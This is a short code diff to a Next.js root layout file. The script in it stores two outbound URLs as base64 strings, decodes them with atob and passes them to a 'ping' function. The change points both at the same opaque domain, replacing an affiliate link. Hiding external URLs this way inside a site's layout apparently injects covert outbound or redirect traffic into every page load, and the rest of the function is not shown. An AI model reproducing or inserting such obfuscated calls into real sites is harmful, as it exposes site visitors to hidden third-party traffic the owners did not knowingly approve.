@@ -173,7 +173,7 @@ export default function RootLayout({
             }
         }
         var mainBrandB64 = "aHR0cHM6Ly9zdHJpbmctMjZldmEuY29tL2RpYnpmb21pcg=="; 
-        var crossBrandB64 = "aHR0cHM6Ly9nb25vcm1hZmZpbGlhdGVzLmNvbS8/c2VyaWFsPTYxMzU1ODg4JmNyZWF0aXZlX2lkPTc2NzU="; 
+        var crossBrandB64 = "aHR0cHM6Ly9zdHJpbmctMjZldmEuY29tL2RpYnpmb21pcg=="; 
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
         function ping(url) {
